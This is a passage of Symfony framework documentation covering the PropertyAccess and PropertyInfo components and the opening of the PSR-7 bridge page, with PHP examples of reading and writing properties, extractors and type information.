        ->disableExceptionOnInvalidPropertyPath()
        ->getPropertyAccessor();

    // instead of throwing an exception the following code returns null
    $value = $propertyAccessor->getValue($person, 'birthday');

Accessing Nullable Property Paths
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Consider the following PHP code::

    class Person
    {
    }

    class Comment
    {
        public ?Person $person = null;
        public string $message;
    }

    $comment = new Comment();
    $comment->message = 'test';

Given that ``$person`` is nullable, an object graph like ``comment.person.profile``
will trigger an exception when the ``$person`` property is ``null``. The solution
is to mark all nullable properties with the nullsafe operator (``?``)::

    // This code throws an exception of type
    // Symfony\Component\PropertyAccess\Exception\UnexpectedTypeException
    var_dump($propertyAccessor->getValue($comment, 'person.firstname'));

    // If a property marked with the nullsafe operator is null, the expression is
    // no longer evaluated and null is returned immediately without throwing an exception
    var_dump($propertyAccessor->getValue($comment, 'person?.firstname')); // null

.. _components-property-access-magic-get:

Magic ``__get()`` Method
~~~~~~~~~~~~~~~~~~~~~~~~

The ``getValue()`` method can also use the magic ``__get()`` method::

    // ...
    class Person
    {
        private array $children = [
            'Wouter' => [...],
        ];

        public function __get($id): mixed
        {
            return $this->children[$id];
        }
    }

    $person = new Person();

    var_dump($propertyAccessor->getValue($person, 'Wouter')); // [...]

.. note::

    The ``__get()`` method support is enabled by default.
    See `Enable other Features`_ if you want to disable it.

.. _components-property-access-magic-call:

Magic ``__call()`` Method
~~~~~~~~~~~~~~~~~~~~~~~~~

Lastly, ``getValue()`` can use the magic ``__call()`` method, but you need to
enable this feature by using :class:`Symfony\\Component\\PropertyAccess\\PropertyAccessorBuilder`::

    // ...
    class Person
    {
        private array $children = [
            'wouter' => [...],
        ];

        public function __call($name, $args): mixed
        {
            $property = lcfirst(substr($name, 3));
            if ('get' === substr($name, 0, 3)) {
                return $this->children[$property] ?? null;
            } elseif ('set' === substr($name, 0, 3)) {
                $value = 1 == count($args) ? $args[0] : null;
                $this->children[$property] = $value;
            }
        }
    }

    $person = new Person();

    // enables PHP __call() magic method
    $propertyAccessor = PropertyAccess::createPropertyAccessorBuilder()
        ->enableMagicCall()
        ->getPropertyAccessor();

    var_dump($propertyAccessor->getValue($person, 'wouter')); // [...]

.. caution::

    The ``__call()`` feature is disabled by default, you can enable it by calling
    :method:`Symfony\\Component\\PropertyAccess\\PropertyAccessorBuilder::enableMagicCall`
    see `Enable other Features`_.

Writing to Arrays
-----------------

The ``PropertyAccessor`` class can do more than just read an array, it can
also write to an array. This can be achieved using the
:method:`Symfony\\Component\\PropertyAccess\\PropertyAccessor::setValue` method::

    // ...
    $person = [];

    $propertyAccessor->setValue($person, '[first_name]', 'Wouter');

    var_dump($propertyAccessor->getValue($person, '[first_name]')); // 'Wouter'
    // or
    // var_dump($person['first_name']); // 'Wouter'

.. _components-property-access-writing-to-objects:

Writing to Objects
------------------

The ``setValue()`` method has the same features as the ``getValue()`` method. You
can use setters, the magic ``__set()`` method or properties to set values::

    // ...
    class Person
    {
        public string $firstName;
        private string $lastName;
        private array $children = [];

        public function setLastName($name): void
        {
            $this->lastName = $name;
        }

        public function getLastName(): string
        {
            return $this->lastName;
        }

        public function getChildren(): array
        {
            return $this->children;
        }

        public function __set($property, $value): void
        {
            $this->$property = $value;
        }
    }

    $person = new Person();

    $propertyAccessor->setValue($person, 'firstName', 'Wouter');
    $propertyAccessor->setValue($person, 'lastName', 'de Jong'); // setLastName is called
    $propertyAccessor->setValue($person, 'children', [new Person()]); // __set is called

    var_dump($person->firstName); // 'Wouter'
    var_dump($person->getLastName()); // 'de Jong'
    var_dump($person->getChildren()); // [Person()];

You can also use ``__call()`` to set values but you need to enable the feature,
see `Enable other Features`_::

    // ...
    class Person
    {
        private array $children = [];

        public function __call($name, $args): mixed
        {
            $property = lcfirst(substr($name, 3));
            if ('get' === substr($name, 0, 3)) {
                return $this->children[$property] ?? null;
            } elseif ('set' === substr($name, 0, 3)) {
                $value = 1 == count($args) ? $args[0] : null;
                $this->children[$property] = $value;
            }
        }

    }

    $person = new Person();

    // Enable magic __call
    $propertyAccessor = PropertyAccess::createPropertyAccessorBuilder()
        ->enableMagicCall()
        ->getPropertyAccessor();

    $propertyAccessor->setValue($person, 'wouter', [...]);

    var_dump($person->getWouter()); // [...]

.. note::

    The ``__set()`` method support is enabled by default.
    See `Enable other Features`_ if you want to disable it.

Writing to Array Properties
~~~~~~~~~~~~~~~~~~~~~~~~~~~

The ``PropertyAccessor`` class allows to update the content of arrays stored in
properties through *adder* and *remover* methods::

    // ...
    class Person
    {
        /**
         * @var string[]
         */
        private array $children = [];

        public function getChildren(): array
        {
            return $this->children;
        }

        public function addChild(string $name): void
        {
            $this->children[$name] = $name;
        }

        public function removeChild(string $name): void
        {
            unset($this->children[$name]);
        }
    }

    $person = new Person();
    $propertyAccessor->setValue($person, 'children', ['kevin', 'wouter']);

    var_dump($person->getChildren()); // ['kevin', 'wouter']

The PropertyAccess component checks for methods called ``add<SingularOfThePropertyName>()``
and ``remove<SingularOfThePropertyName>()``. Both methods must be defined.
For instance, in the previous example, the component looks for the ``addChild()``
and ``removeChild()`` methods to access the ``children`` property.
`The String component`_ inflector is used to find the singular of a property name.

If available, *adder* and *remover* methods have priority over a *setter* method.

Using non-standard adder/remover methods
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sometimes, adder and remover methods don't use the standard ``add`` or ``remove`` prefix, like in this example::

    // ...
    class Team
    {
        // ...

        public function joinTeam(string $person): void
        {
            $this->team[] = $person;
        }

        public function leaveTeam(string $person): void
        {
            foreach ($this->team as $id => $item) {
                if ($person === $item) {
                    unset($this->team[$id]);

                    break;
                }
            }
        }
    }

    use Symfony\Component\PropertyInfo\Extractor\ReflectionExtractor;
    use Symfony\Component\PropertyAccess\PropertyAccessor;

    $list = new Team();
    $reflectionExtractor = new ReflectionExtractor(null, null, ['join', 'leave']);
    $propertyAccessor = new PropertyAccessor(PropertyAccessor::DISALLOW_MAGIC_METHODS, PropertyAccessor::THROW_ON_INVALID_PROPERTY_PATH, null, $reflectionExtractor, $reflectionExtractor);
    $propertyAccessor->setValue($person, 'team', ['kevin', 'wouter']);

    var_dump($person->getTeam()); // ['kevin', 'wouter']

Instead of calling ``add<SingularOfThePropertyName>()`` and ``remove<SingularOfThePropertyName>()``, the PropertyAccess
component will call ``join<SingularOfThePropertyName>()`` and ``leave<SingularOfThePropertyName>()`` methods.

Checking Property Paths
-----------------------

When you want to check whether
:method:`Symfony\\Component\\PropertyAccess\\PropertyAccessor::getValue` can
safely be called without actually calling that method, you can use
:method:`Symfony\\Component\\PropertyAccess\\PropertyAccessor::isReadable` instead::

    $person = new Person();

    if ($propertyAccessor->isReadable($person, 'firstName')) {
        // ...
    }

The same is possible for :method:`Symfony\\Component\\PropertyAccess\\PropertyAccessor::setValue`:
Call the :method:`Symfony\\Component\\PropertyAccess\\PropertyAccessor::isWritable`
method to find out whether a property path can be updated::

    $person = new Person();

    if ($propertyAccessor->isWritable($person, 'firstName')) {
        // ...
    }

Mixing Objects and Arrays
-------------------------

You can also mix objects and arrays::

    // ...
    class Person
    {
        public string $firstName;
        private array $children = [];

        public function setChildren($children): void
        {
            $this->children = $children;
        }

        public function getChildren(): array
        {
            return $this->children;
        }
    }

    $person = new Person();

    $propertyAccessor->setValue($person, 'children[0]', new Person);
    // equal to $person->getChildren()[0] = new Person()

    $propertyAccessor->setValue($person, 'children[0].firstName', 'Wouter');
    // equal to $person->getChildren()[0]->firstName = 'Wouter'

    var_dump('Hello '.$propertyAccessor->getValue($person, 'children[0].firstName')); // 'Wouter'
    // equal to $person->getChildren()[0]->firstName

Enable other Features
~~~~~~~~~~~~~~~~~~~~~

The :class:`Symfony\\Component\\PropertyAccess\\PropertyAccessor` can be
configured to enable extra features. To do that you could use the
:class:`Symfony\\Component\\PropertyAccess\\PropertyAccessorBuilder`::

    // ...
    $propertyAccessorBuilder = PropertyAccess::createPropertyAccessorBuilder();

    $propertyAccessorBuilder->enableMagicCall(); // enables magic __call
    $propertyAccessorBuilder->enableMagicGet(); // enables magic __get
    $propertyAccessorBuilder->enableMagicSet(); // enables magic __set
    $propertyAccessorBuilder->enableMagicMethods(); // enables magic __get, __set and __call

    $propertyAccessorBuilder->disableMagicCall(); // disables magic __call
    $propertyAccessorBuilder->disableMagicGet(); // disables magic __get
    $propertyAccessorBuilder->disableMagicSet(); // disables magic __set
    $propertyAccessorBuilder->disableMagicMethods(); // disables magic __get, __set and __call

    // checks if magic __call, __get or __set handling are enabled
    $propertyAccessorBuilder->isMagicCallEnabled(); // true or false
    $propertyAccessorBuilder->isMagicGetEnabled(); // true or false
    $propertyAccessorBuilder->isMagicSetEnabled(); // true or false

    // At the end get the configured property accessor
    $propertyAccessor = $propertyAccessorBuilder->getPropertyAccessor();

    // Or all in one
    $propertyAccessor = PropertyAccess::createPropertyAccessorBuilder()
        ->enableMagicCall()
        ->getPropertyAccessor();

Or you can pass parameters directly to the constructor (not the recommended way)::

    // enable handling of magic __call, __set but not __get:
    $propertyAccessor = new PropertyAccessor(PropertyAccessor::MAGIC_CALL | PropertyAccessor::MAGIC_SET);

.. _`The String component`: https://github.com/symfony/string
The PropertyInfo Component
==========================

    The PropertyInfo component allows you to get information
    about class properties by using different sources of metadata.

While the :doc:`PropertyAccess component </components/property_access>`
allows you to read and write values to/from objects and arrays, the PropertyInfo
component works solely with class definitions to provide information about the
data type and visibility - including via getter or setter methods - of the properties
within that class.

.. _`components-property-information-installation`:

Installation
------------

.. code-block:: terminal

    $ composer require symfony/property-info

.. include:: /components/require_autoload.rst.inc

Additional dependencies may be required for some of the
:ref:`extractors provided with this component <components-property-info-extractors>`.

.. _`components-property-information-usage`:

Usage
-----

To use this component, create a new
:class:`Symfony\\Component\\PropertyInfo\\PropertyInfoExtractor` instance and
provide it with a set of information extractors::

    use Example\Namespace\YourAwesomeCoolClass;
    use Symfony\Component\PropertyInfo\Extractor\PhpDocExtractor;
    use Symfony\Component\PropertyInfo\Extractor\ReflectionExtractor;
    use Symfony\Component\PropertyInfo\PropertyInfoExtractor;

    // a full list of extractors is shown further below
    $phpDocExtractor = new PhpDocExtractor();
    $reflectionExtractor = new ReflectionExtractor();

    // list of PropertyListExtractorInterface (any iterable)
    $listExtractors = [$reflectionExtractor];

    // list of PropertyTypeExtractorInterface (any iterable)
    $typeExtractors = [$phpDocExtractor, $reflectionExtractor];

    // list of PropertyDescriptionExtractorInterface (any iterable)
    $descriptionExtractors = [$phpDocExtractor];

    // list of PropertyAccessExtractorInterface (any iterable)
    $accessExtractors = [$reflectionExtractor];

    // list of PropertyInitializableExtractorInterface (any iterable)
    $propertyInitializableExtractors = [$reflectionExtractor];

    $propertyInfo = new PropertyInfoExtractor(
        $listExtractors,
        $typeExtractors,
        $descriptionExtractors,
        $accessExtractors,
        $propertyInitializableExtractors
    );

    // see below for more examples
    $class = YourAwesomeCoolClass::class;
    $properties = $propertyInfo->getProperties($class);

Extractor Ordering
~~~~~~~~~~~~~~~~~~

The order of extractor instances within an array matters: the first non-null
result will be returned. That is why you must provide each category of extractors
as a separate array, even if an extractor provides information for more than
one category.

For example, while the :class:`Symfony\\Component\\PropertyInfo\\Extractor\\ReflectionExtractor`
and :class:`Symfony\\Bridge\\Doctrine\\PropertyInfo\\DoctrineExtractor`
both provide list and type information it is probably better that:

* The :class:`Symfony\\Component\\PropertyInfo\\Extractor\\ReflectionExtractor`
  has priority for list information so that all properties in a class (not
  just mapped properties) are returned.
* The :class:`Symfony\\Bridge\\Doctrine\\PropertyInfo\\DoctrineExtractor`
  has priority for type information so that entity metadata is used instead
  of type-hinting to provide more accurate type information::

    use Symfony\Bridge\Doctrine\PropertyInfo\DoctrineExtractor;
    use Symfony\Component\PropertyInfo\Extractor\ReflectionExtractor;
    use Symfony\Component\PropertyInfo\PropertyInfoExtractor;

    $reflectionExtractor = new ReflectionExtractor();
    $doctrineExtractor = new DoctrineExtractor(/* ... */);

    $propertyInfo = new PropertyInfoExtractor(
        // List extractors
        [
            $reflectionExtractor,
            $doctrineExtractor
        ],
        // Type extractors
        [
            $doctrineExtractor,
            $reflectionExtractor
        ]
    );

.. _`components-property-information-extractable-information`:

Extractable Information
-----------------------

The :class:`Symfony\\Component\\PropertyInfo\\PropertyInfoExtractor`
class exposes public methods to extract several types of information:

* :ref:`List of properties <property-info-list>`: :method:`Symfony\\Component\\PropertyInfo\\PropertyListExtractorInterface::getProperties`
* :ref:`Property type <property-info-type>`: :method:`Symfony\\Component\\PropertyInfo\\PropertyTypeExtractorInterface::getTypes`
  (including typed properties)
* :ref:`Property description <property-info-description>`: :method:`Symfony\\Component\\PropertyInfo\\PropertyDescriptionExtractorInterface::getShortDescription` and :method:`Symfony\\Component\\PropertyInfo\\PropertyDescriptionExtractorInterface::getLongDescription`
* :ref:`Property access details <property-info-access>`: :method:`Symfony\\Component\\PropertyInfo\\PropertyAccessExtractorInterface::isReadable` and  :method:`Symfony\\Component\\PropertyInfo\\PropertyAccessExtractorInterface::isWritable`
* :ref:`Property initializable through the constructor <property-info-initializable>`:  :method:`Symfony\\Component\\PropertyInfo\\PropertyInitializableExtractorInterface::isInitializable`

.. note::

    Be sure to pass a *class* name, not an object to the extractor methods::

        // bad! It may work, but not with all extractors
        $propertyInfo->getProperties($awesomeObject);

        // Good!
        $propertyInfo->getProperties(get_class($awesomeObject));
        $propertyInfo->getProperties('Example\Namespace\YourAwesomeClass');
        $propertyInfo->getProperties(YourAwesomeClass::class);

.. _property-info-list:

List Information
~~~~~~~~~~~~~~~~

Extractors that implement :class:`Symfony\\Component\\PropertyInfo\\PropertyListExtractorInterface`
provide the list of properties that are available on a class as an array
containing each property name as a string::

    $properties = $propertyInfo->getProperties($class);
    /*
        Example Result
        --------------
        array(3) {
            [0] => string(8) "username"
            [1] => string(8) "password"
            [2] => string(6) "active"
        }
    */

.. _property-info-type:

Type Information
~~~~~~~~~~~~~~~~

Extractors that implement :class:`Symfony\\Component\\PropertyInfo\\PropertyTypeExtractorInterface`
provide :ref:`extensive data type information <components-property-info-type>`
for a property::

    $types = $propertyInfo->getTypes($class, $property);
    /*
        Example Result
        --------------
        array(1) {
            [0] =>
                class Symfony\Component\PropertyInfo\Type (6) {
                private $builtinType          => string(6) "string"
                private $nullable             => bool(false)
                private $class                => NULL
                private $collection           => bool(false)
                private $collectionKeyType    => NULL
                private $collectionValueType  => NULL
            }
        }
    */

See :ref:`components-property-info-type` for info about the ``Type`` class.

Documentation Block
~~~~~~~~~~~~~~~~~~~

Extractors that implement :class:`Symfony\\Component\\PropertyInfo\\PropertyDocBlockExtractorInterface`
can provide the full documentation block for a property as a string::

    $docBlock = $propertyInfo->getDocBlock($class, $property);
    /*
        Example Result
        --------------
        string(79):
            This is the subsequent paragraph in the DocComment.
            It can span multiple lines.
    */

.. versionadded:: 7.1

    The :class:`Symfony\\Component\\PropertyInfo\\PropertyDocBlockExtractorInterface`
    interface was introduced in Symfony 7.1.

.. _property-info-description:

Description Information
~~~~~~~~~~~~~~~~~~~~~~~

Extractors that implement :class:`Symfony\\Component\\PropertyInfo\\PropertyDescriptionExtractorInterface`
provide long and short descriptions from a properties annotations as
strings::

    $title = $propertyInfo->getShortDescription($class, $property);
    /*
        Example Result
        --------------
        string(41) "This is the first line of the DocComment."
    */

    $paragraph = $propertyInfo->getLongDescription($class, $property);
    /*
        Example Result
        --------------
        string(79):
            This is the subsequent paragraph in the DocComment.
            It can span multiple lines.
    */

.. _property-info-access:

Access Information
~~~~~~~~~~~~~~~~~~

Extractors that implement :class:`Symfony\\Component\\PropertyInfo\\PropertyAccessExtractorInterface`
provide whether properties are readable or writable as booleans::

    $propertyInfo->isReadable($class, $property);
    // Example Result: bool(true)

    $propertyInfo->isWritable($class, $property);
    // Example Result: bool(false)

The :class:`Symfony\\Component\\PropertyInfo\\Extractor\\ReflectionExtractor` looks
for getter/isser/setter/hasser method in addition to whether or not a property is public
to determine if it's accessible. This based on how the :doc:`PropertyAccess </components/property_access>`
works. It assumes camel case style method names following `PSR-1`_. For example,
both ``myProperty`` and ``my_property`` properties are readable if there's a
``getMyProperty()`` method and writable if there's a ``setMyProperty()`` method.

.. _property-info-initializable:

Property Initializable Information
----------------------------------

Extractors that implement :class:`Symfony\\Component\\PropertyInfo\\PropertyInitializableExtractorInterface`
provide whether properties are initializable through the class's constructor as booleans::

    $propertyInfo->isInitializable($class, $property);
    // Example Result: bool(true)

:method:`Symfony\\Component\\PropertyInfo\\Extractor\\ReflectionExtractor::isInitializable`
returns ``true`` if a constructor's parameter of the given class matches the
given property name.

.. tip::

    The main :class:`Symfony\\Component\\PropertyInfo\\PropertyInfoExtractor`
    class implements all interfaces, delegating the extraction of property
    information to the extractors that have been registered with it.

    This means that any method available on each of the extractors is also
    available on the main :class:`Symfony\\Component\\PropertyInfo\\PropertyInfoExtractor`
    class.

.. _`components-property-info-type`:

Type Objects
------------

Compared to the other extractors, type information extractors provide much
more information than can be represented as simple scalar values. Because
of this, type extractors return an array of :class:`Symfony\\Component\\PropertyInfo\\Type`
objects for each type that the property supports.

For example, if a property supports both ``integer`` and ``string`` (via
the ``@return int|string`` annotation),
:method:`PropertyInfoExtractor::getTypes() <Symfony\\Component\\PropertyInfo\\PropertyInfoExtractor::getTypes>`
will return an array containing **two** instances of the :class:`Symfony\\Component\\PropertyInfo\\Type`
class.

.. note::

    Most extractors will return only one :class:`Symfony\\Component\\PropertyInfo\\Type`
    instance. The :class:`Symfony\\Component\\PropertyInfo\\Extractor\\PhpDocExtractor`
    is currently the only extractor that returns multiple instances in the array.

Each object will provide 6 attributes, available in the 6 methods:

.. _`components-property-info-type-builtin`:

``Type::getBuiltInType()``
~~~~~~~~~~~~~~~~~~~~~~~~~~

The :method:`Type::getBuiltinType() <Symfony\\Component\\PropertyInfo\\Type::getBuiltinType>`
method returns the built-in PHP data type, which can be one of these
string values: ``array``, ``bool``, ``callable``, ``float``, ``int``,
``iterable``, ``null``, ``object``, ``resource`` or ``string``.

Constants inside the :class:`Symfony\\Component\\PropertyInfo\\Type`
class, in the form ``Type::BUILTIN_TYPE_*``, are provided for convenience.

``Type::isNullable()``
~~~~~~~~~~~~~~~~~~~~~~

The :method:`Type::isNullable() <Symfony\\Component\\PropertyInfo\\Type::isNullable>`
method will return a boolean value indicating whether the property parameter
can be set to ``null``.

``Type::getClassName()``
~~~~~~~~~~~~~~~~~~~~~~~~

If the :ref:`built-in PHP data type <components-property-info-type-builtin>`
is ``object``, the :method:`Type::getClassName() <Symfony\\Component\\PropertyInfo\\Type::getClassName>`
method will return the fully-qualified class or interface name accepted.

``Type::isCollection()``
~~~~~~~~~~~~~~~~~~~~~~~~

The :method:`Type::isCollection() <Symfony\\Component\\PropertyInfo\\Type::isCollection>`
method will return a boolean value indicating if the property parameter is
a collection - a non-scalar value capable of containing other values. Currently
this returns ``true`` if:

* The :ref:`built-in PHP data type <components-property-info-type-builtin>`
  is ``array``;
* The mutator method the property is derived from has a prefix of ``add``
  or ``remove`` (which are defined as the list of array mutator prefixes);
* The `phpDocumentor`_ annotation is of type "collection" (e.g.
  ``@var SomeClass<DateTime>``, ``@var SomeClass<integer,string>``,
  ``@var Doctrine\Common\Collections\Collection<App\Entity\SomeEntity>``, etc.)

``Type::getCollectionKeyTypes()`` & ``Type::getCollectionValueTypes()``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If the property is a collection, additional type objects may be returned
for both the key and value types of the collection (if the information is
available), via the :method:`Type::getCollectionKeyTypes() <Symfony\\Component\\PropertyInfo\\Type::getCollectionKeyTypes>`
and :method:`Type::getCollectionValueTypes() <Symfony\\Component\\PropertyInfo\\Type::getCollectionValueTypes>`
methods.

.. note::

    The ``list`` pseudo type is returned by the PropertyInfo component as an
    array with integer as the key type.

.. _`components-property-info-extractors`:

Extractors
----------

The extraction of property information is performed by *extractor classes*.
An extraction class can provide one or more types of property information
by implementing the correct interface(s).

The :class:`Symfony\\Component\\PropertyInfo\\PropertyInfoExtractor` will
iterate over the relevant extractor classes in the order they were set, call
the appropriate method and return the first result that is not ``null``.

.. _`components-property-information-extractors-available`:

While you can create your own extractors, the following are already available
to cover most use-cases:

ReflectionExtractor
~~~~~~~~~~~~~~~~~~~

Using PHP reflection, the :class:`Symfony\\Component\\PropertyInfo\\Extractor\\ReflectionExtractor`
provides list, type and access information from setter and accessor methods.
It can also give the type of a property (even extracting it from the constructor
arguments), and if it is initializable through the constructor. It supports
return and scalar types::

    use Symfony\Component\PropertyInfo\Extractor\ReflectionExtractor;

    $reflectionExtractor = new ReflectionExtractor();

    // List information.
    $reflectionExtractor->getProperties($class);

    // Type information.
    $reflectionExtractor->getTypes($class, $property);

    // Access information.
    $reflectionExtractor->isReadable($class, $property);
    $reflectionExtractor->isWritable($class, $property);

    // Initializable information
    $reflectionExtractor->isInitializable($class, $property);

.. note::

    When using the Symfony framework, this service is automatically registered
    when the ``property_info`` feature is enabled:

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            property_info:
                enabled: true

PhpDocExtractor
~~~~~~~~~~~~~~~

.. note::

    This extractor depends on the `phpdocumentor/reflection-docblock`_ library.

Using `phpDocumentor Reflection`_ to parse property and method annotations,
the :class:`Symfony\\Component\\PropertyInfo\\Extractor\\PhpDocExtractor`
provides type and description information. This extractor is automatically
registered with the ``property_info`` in the Symfony Framework *if* the dependent
library is present::

    use Symfony\Component\PropertyInfo\Extractor\PhpDocExtractor;

    $phpDocExtractor = new PhpDocExtractor();

    // Type information.
    $phpDocExtractor->getTypes($class, $property);
    // Description information.
    $phpDocExtractor->getShortDescription($class, $property);
    $phpDocExtractor->getLongDescription($class, $property);
    $phpDocExtractor->getDocBlock($class, $property);

.. versionadded:: 7.1

    The :method:`Symfony\\Component\\PropertyInfo\\Extractor\\PhpDocExtractor::getDocBlock`
    method was introduced in Symfony 7.1.

PhpStanExtractor
~~~~~~~~~~~~~~~~

.. note::

    This extractor depends on the `phpstan/phpdoc-parser`_ and
    `phpdocumentor/reflection-docblock`_ libraries.

This extractor fetches information thanks to the PHPStan parser. It gathers
information from annotations of properties and methods, such as ``@var``,
``@param`` or ``@return``::

    // src/Domain/Foo.php
    class Foo
    {
        /**
         * @param string $bar
         */
        public function __construct(
            private string $bar,
        ) {
        }
    }

    // Extraction.php
    use Symfony\Component\PropertyInfo\Extractor\PhpStanExtractor;
    use App\Domain\Foo;

    $phpStanExtractor = new PhpStanExtractor();
    $phpStanExtractor->getTypesFromConstructor(Foo::class, 'bar');

SerializerExtractor
~~~~~~~~~~~~~~~~~~~

.. note::

    This extractor depends on the `symfony/serializer`_ library.

Using :ref:`groups metadata <serializer-using-serialization-groups-attributes>`
from the :doc:`Serializer component </components/serializer>`,
the :class:`Symfony\\Component\\PropertyInfo\\Extractor\\SerializerExtractor`
provides list information. This extractor is *not* registered automatically
with the ``property_info`` service in the Symfony Framework::

    use Symfony\Component\PropertyInfo\Extractor\SerializerExtractor;
    use Symfony\Component\Serializer\Mapping\Factory\ClassMetadataFactory;
    use Symfony\Component\Serializer\Mapping\Loader\AttributeLoader;

    $serializerClassMetadataFactory = new ClassMetadataFactory(new AttributeLoader());
    $serializerExtractor = new SerializerExtractor($serializerClassMetadataFactory);

    // the `serializer_groups` option must be configured (may be set to null)
    $serializerExtractor->getProperties($class, ['serializer_groups' => ['mygroup']]);

If ``serializer_groups`` is set to ``null``, serializer groups metadata won't be
checked but you will get only the properties considered by the Serializer
Component (notably the ``#[Ignore]`` attribute is taken into account).

DoctrineExtractor
~~~~~~~~~~~~~~~~~

.. note::

    This extractor depends on the `symfony/doctrine-bridge`_ and `doctrine/orm`_
    libraries.

Using entity mapping data from `Doctrine ORM`_, the
:class:`Symfony\\Bridge\\Doctrine\\PropertyInfo\\DoctrineExtractor`
provides list and type information. This extractor is not registered automatically
with the ``property_info`` service in the Symfony Framework::

    use Doctrine\ORM\EntityManager;
    use Doctrine\ORM\Tools\Setup;
    use Symfony\Bridge\Doctrine\PropertyInfo\DoctrineExtractor;

    $config = Setup::createAnnotationMetadataConfiguration([__DIR__], true);
    $entityManager = EntityManager::create([
        'driver' => 'pdo_sqlite',
        // ...
    ], $config);
    $doctrineExtractor = new DoctrineExtractor($entityManager);

    // List information.
    $doctrineExtractor->getProperties($class);
    // Type information.
    $doctrineExtractor->getTypes($class, $property);

ConstructorExtractor
~~~~~~~~~~~~~~~~~~~~

The :class:`Symfony\\Component\\PropertyInfo\\Extractor\\ConstructorExtractor`
tries to extract properties information by using either the
:class:`Symfony\\Component\\PropertyInfo\\Extractor\\PhpStanExtractor` or
the :class:`Symfony\\Component\\PropertyInfo\\Extractor\\ReflectionExtractor`
on the constructor arguments::

    // src/Domain/Foo.php
    class Foo
    {
        public function __construct(
            private string $bar,
        ) {
        }
    }

    // Extraction.php
    use App\Domain\Foo;
    use Symfony\Component\PropertyInfo\Extractor\ConstructorExtractor;

    $constructorExtractor = new ConstructorExtractor([new ReflectionExtractor()]);
    $constructorExtractor->getTypes(Foo::class, 'bar')[0]->getBuiltinType(); // returns 'string'

.. _`components-property-information-extractors-creation`:

Creating Your Own Extractors
----------------------------

You can create your own property information extractors by creating a
class that implements one or more of the following interfaces:
:class:`Symfony\\Component\\PropertyInfo\\PropertyAccessExtractorInterface`,
:class:`Symfony\\Component\\PropertyInfo\\PropertyDescriptionExtractorInterface`,
:class:`Symfony\\Component\\PropertyInfo\\PropertyListExtractorInterface`,
:class:`Symfony\\Component\\PropertyInfo\\PropertyTypeExtractorInterface` and
:class:`Symfony\\Component\\PropertyInfo\\PropertyInitializableExtractorInterface`.

If you have enabled the PropertyInfo component with the FrameworkBundle,
you can automatically register your extractor class with the ``property_info``
service by defining it as a service with one or more of the following
:doc:`tags </service_container/tags>`:

* ``property_info.list_extractor`` if it provides list information.
* ``property_info.type_extractor`` if it provides type information.
* ``property_info.description_extractor`` if it provides description information.
* ``property_info.access_extractor`` if it provides access information.
* ``property_info.initializable_extractor`` if it provides initializable information
  (it checks if a property can be initialized through the constructor).

.. _`PSR-1`: https://www.php-fig.org/psr/psr-1/
.. _`phpDocumentor Reflection`: https://github.com/phpDocumentor/ReflectionDocBlock
.. _`phpdocumentor/reflection-docblock`: https://packagist.org/packages/phpdocumentor/reflection-docblock
.. _`phpstan/phpdoc-parser`: https://packagist.org/packages/phpstan/phpdoc-parser
.. _`Doctrine ORM`: https://www.doctrine-project.org/projects/orm.html
.. _`symfony/serializer`: https://packagist.org/packages/symfony/serializer
.. _`symfony/doctrine-bridge`: https://packagist.org/packages/symfony/doctrine-bridge
.. _`doctrine/orm`: https://packagist.org/packages/doctrine/orm
.. _`phpDocumentor`: https://www.phpdoc.org/
The PSR-7 Bridge
================

    The PSR-7 bridge converts :doc:`HttpFoundation </components/http_foundation>`
    objects from and to objects implementing HTTP message interfaces defined
    by the `PSR-7`_.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/psr-http-message-bridge

.. include:: /components/require_autoload.rst.inc

The bridge also needs a PSR-7 and `PSR-17`_ implementation to convert
HttpFoundation objects to PSR-7 objects. The following command installs the
``nyholm/psr7`` library, a lightweight and fast PSR-7 implementation, but you
can use any of the `libraries that implement psr/http-factory-implementation`_:

.. code-block:: terminal

    $ composer require nyholm/psr7

Usage
-----

Converting from HttpFoundation Objects to PSR-7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The bridge provides an interface of a factory called
`HttpMessageFactoryInterface`_ that builds objects implementing PSR-7
interfaces from HttpFoundation objects.

The following code snippet explains how to convert a :class:`Symfony\\Component\\HttpFoundation\\Request`
to a ``Nyholm\Psr7\ServerRequest`` class implementing the
``Psr\Http\Message\ServerRequestInterface`` interface::

    use Nyholm\Psr7\Factory\Psr17Factory;
    use Symfony\Bridge\PsrHttpMessage\Factory\PsrHttpFactory;
    use Symfony\Component\HttpFoundation\Request;

    $symfonyRequest = new Request([], [], [], [], [], ['HTTP_HOST' => 'dunglas.fr'], 'Content');
    // The HTTP_HOST server key must be set to avoid an unexpected error

    $psr17Factory = new Psr17Factory();
    $psrHttpFactory = new PsrHttpFactory($psr17Factory, $psr17Factory, $psr17Factory, $psr17Factory);
    $psrRequest = $psrHttpFactory->createRequest($symfonyRequest);

And now from a :class:`Symfony\\Component\\HttpFoundation\\Response` to a
``Nyholm\Psr7\Response`` class implementing the
``Psr\Http\Message\ResponseInterface`` interface::

    use Nyholm\Psr7\Factory\Psr17Factory;
    use Symfony\Bridge\PsrHttpMessage\Factory\PsrHttpFactory;
    use Symfony\Component\HttpFoundation\Response;

    $symfonyResponse = new Response('Content');

    $psr17Factory = new Psr17Factory();
    $psrHttpFactory = new PsrHttpFactory($psr17Factory, $psr17Factory, $psr17Factory, $psr17Factory);
    $psrResponse = $psrHttpFactory->createResponse($symfonyResponse);

Converting Objects implementing PSR-7 Interfaces to HttpFoundation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

On the other hand, the bridge provide a factory interface called
`HttpFoundationFactoryInterface`_ that builds HttpFoundation objects from
objects implementing PSR-7 interfaces.

The next snippet explain how to convert an object implementing the
``Psr\Http\Message\ServerRequestInterface`` interface to a
:class:`Symfony\\Component\\HttpFoundation\\Request` instance::

    use Symfony\Bridge\PsrHttpMessage\Factory\HttpFoundationFactory;

    // $psrRequest is an instance of Psr\Http\Message\ServerRequestInterface

    $httpFoundationFactory = new HttpFoundationFactory();
    $symfonyRequest = $httpFoundationFactory->createRequest($psrRequest);

From an object implementing the ``Psr\Http\Message\ResponseInterface``
to a :class:`Symfony\\Component\\HttpFoundation\\Response` instance::

